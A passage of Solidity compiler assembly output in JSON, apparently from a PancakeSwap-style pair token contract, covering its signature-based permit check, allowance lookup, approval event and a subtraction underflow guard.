											"end": 4088,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "ADD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP5"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP14"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "AND"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP13"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP12"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "MLOAD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "SWAP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP4"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "ADD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "122"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP5"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP3"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP4"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "KECCAK256"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP4"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP7"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP10"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "AND"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP9"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP8"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP2"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP4"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SUB"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "GAS"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "STATICCALL"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP2"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "AND"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP1"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "SWAP1"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPI"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "POP"
										},
										{
											"begin": 4334,
											"end": 4339,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4330,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "EQ"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPDEST"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH [tag]",
											"value": "79"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPI"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SUB"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "REVERT"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "tag",
											"value": "79"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPDEST"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 4410,
											"end": 4415,
											"name": "DUP10"
										},
										{
											"begin": 4417,
											"end": 4424,
											"name": "DUP10"
										},
										{
											"begin": 4426,
											"end": 4431,
											"name": "DUP10"
										},
										{
											"begin": 4401,
											"end": 4409,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP5"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SLOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2502,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP4"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP8"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP2"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "DUP6"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP6"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP3"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SUB"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "ADD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "LOG3"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
